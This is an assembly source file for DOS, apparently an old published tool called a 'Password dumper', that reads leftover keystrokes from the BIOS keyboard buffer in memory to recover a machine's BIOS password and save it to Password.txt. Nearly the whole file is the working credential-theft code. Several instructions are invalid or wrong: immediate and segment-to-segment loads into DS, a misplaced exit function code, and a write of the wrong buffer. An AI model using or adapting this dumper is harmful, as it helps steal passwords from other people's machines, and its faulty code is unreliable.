;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Endrazine endrazine (at) pulltheplug (dot) org [email concealed] ;
; Bios Password Physical Memory Reader ;
; Write to file Windows Compatible version ;
; ;
;Compiling : A86 wbiosw.asm wbiosw.com ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

code segment
org 100h
assume ds:code, es:code, cs:code

start:
mov ah, 09h
mov dx,offset welcome
int 21h

xor ax,ax
int 16h

mov ds, 40h ; This is the input buffer adress
mov si, 01EH ; starting at 40h:01eh
mov di,offset buffer
mov cx,32

daloop:
mov ax,[ds:si]
mov [cs:di],ax
inc di
add si,2 ; Replace this line by add si,4
; if you plan to use it under Dos
loop daloop

mov ds,es

mov ah, 3ch ; MS DOS Create file Function
mov dx, offset fname
xor cx,cx
int 21h

mov ax, 3d01h ; MS DOS Open file Function
int 21h
mov handle,ax

mov ah, 40h
mov bx,handle
mov cx,32
mov dx, offset Msg
int 21h ; Write buffer to file

mov ax,4ch ; Quit
int 21h

handle dw ?
welcome db 'Password dumper by Endrazine (endrazine (at) pulltheplug (dot) org [email concealed])',10,13
db '',10,13
db 'Dumping Password to Password.txt',10,13
db 'Press any Key$',10,13
fname db 'Password.txt',0
Msg db 'Password is : ',0
buffer db 32 dup ?
end start

end
